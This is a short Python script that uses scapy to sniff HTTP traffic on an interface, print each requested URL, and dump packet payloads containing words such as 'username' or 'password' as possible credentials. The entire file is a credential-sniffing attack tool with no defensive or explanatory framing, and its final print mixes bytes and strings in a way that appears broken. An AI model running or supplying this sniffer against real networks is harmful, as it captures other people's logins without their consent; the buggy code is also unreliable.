#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user","uname","password", "login","pass"]
            try:
                for kayword in keywords:
                    if kayword.encode() in load: # using encode to change the keyword into byte type
                        return load
                        
            except Exception as e:
                pass

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url= get_url(packet=packet)

        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet=packet)

        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

        


sniff("eth0")